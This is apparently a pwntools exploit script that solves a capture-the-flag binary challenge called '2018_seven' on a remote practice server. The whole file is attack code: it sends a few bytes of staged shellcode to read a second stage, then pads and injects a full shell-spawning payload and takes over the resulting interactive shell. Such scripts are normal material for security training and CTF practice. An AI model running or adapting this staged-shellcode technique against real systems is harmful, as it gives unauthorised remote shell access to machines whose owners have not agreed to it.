from pwn import *
#context.log_level = 'debug'
context(os='linux',arch='amd64',endian='little')
# p = process('./2018_seven')
p=remote('node3.buuoj.cn',26430)
#gdb.attach(p,'b *0x555555554d0b')
shellcode = asm('push rsp;pop rsi;mov dx,si;syscall')
p.sendafter('shellcode:\n',shellcode)
sleep(1)
p.sendline('A'*0xb37+ asm(shellcraft.sh()))

p.interactive()